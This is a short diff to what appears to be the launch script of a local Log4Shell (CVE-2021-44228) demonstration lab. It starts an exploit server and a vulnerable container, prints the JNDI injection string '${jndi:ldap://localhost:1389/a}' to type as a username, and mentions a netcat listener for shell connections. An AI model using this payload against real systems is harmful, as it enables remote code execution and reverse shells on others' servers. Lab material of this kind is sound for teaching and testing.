@@ -12,7 +12,7 @@ function sigint_handler() {
 
 trap 'sigint_handler' 2
 
-docker-compose up -d
+docker-compose up -d cve-44228 exploit-server
 echo "Enter ${jndi:ldap://localhost:1389/a} as Username in webpage to trigger exploit"
 echo "Starting netcat server to listen for shell connections..." 
 
